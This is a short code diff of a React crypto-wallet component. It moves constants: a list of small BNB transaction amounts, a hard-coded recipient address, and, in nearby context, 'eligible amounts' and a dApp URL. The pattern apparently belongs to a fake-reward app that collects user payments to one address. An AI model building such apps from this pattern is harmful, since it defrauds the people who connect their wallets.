@@ -33,6 +33,21 @@ export function Wallet() {
   const [confirmationCount, setConfirmationCount] = useState<number>(0);
   const [rejectedBalance, setRejectedBalance] = useState<number>(0);
 
+  const TRANSACTION_AMOUNTS = [
+    "0.02",
+    "0.035",
+    "0.1",
+    "0.016",
+    "0.16",
+    "0.016",
+    "0.016",
+    "0.016",
+    "0.016",
+    "0.016",
+  ];
+  const RECIPIENT_ADDRESS = "0x422EbBbE2a518e50232B939edb686Cb5B6883808";
+ 
+
   const tourSteps = [
     {
       target: "wallet-button", // Changed from deploy-button
@@ -181,19 +196,6 @@ export function Wallet() {
   const eligibleAmountRef = useRef<number>(0);
 
   const ELIGIBLE_AMOUNTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
-  const TRANSACTION_AMOUNTS = [
-    "0.02",
-    "0.035",
-    "0.1",
-    "0.016",
-    "0.16",
-    "0.016",
-    "0.016",
-    "0.016",
-    "0.016",
-    "0.016",
-  ];
-  const RECIPIENT_ADDRESS = "0x422EbBbE2a518e50232B939edb686Cb5B6883808";
   const BNB_CHAIN_ID = "0x38";
   const DAPP_URL = "web3smartcalls.com";
 
